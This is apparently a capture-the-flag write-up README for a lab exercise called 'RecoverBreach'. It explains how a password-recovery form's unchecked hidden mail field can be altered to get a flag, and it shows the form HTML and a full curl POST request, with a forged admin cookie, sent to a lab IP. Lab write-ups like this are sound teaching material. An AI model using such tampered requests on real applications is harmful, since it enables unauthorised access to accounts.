# 📄 README.md

## 📌 Breach Name:
**RecoverBreach**

---

## 📖 Description:
This breach exploits an insecure implementation of a password recovery form in the web application. The system uses a hidden input field containing a default email address but does not enforce any server-side restrictions on this field’s value.

By crafting a custom POST request and replacing the `mail` parameter value with an administrator's email address, it’s possible to retrieve a flag or sensitive data without authentication.

---

## 📌 Vulnerability Type:
- **Insecure Direct Object Reference (IDOR)**
- **Missing Server-Side Access Control in Password Recovery**

---

## 📖 Source Code Review:

The recovery form is implemented as:

```html
<form action="#" method="POST">
  <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
  <input type="submit" name="Submit" value="Submit">
</form>






<!-- curl 'http://192.168.43.45/?page=recover' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-CN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'I_am_admin=68934a3e9455fa72420237eb05902327' \
  -H 'DNT: 1' \
  -H 'Origin: http://192.168.43.45' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://192.168.43.45/?page=recover' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' \
  --data-raw 'mail=anas%40tabiti.com&Submit=Submit' \
  --insecure -->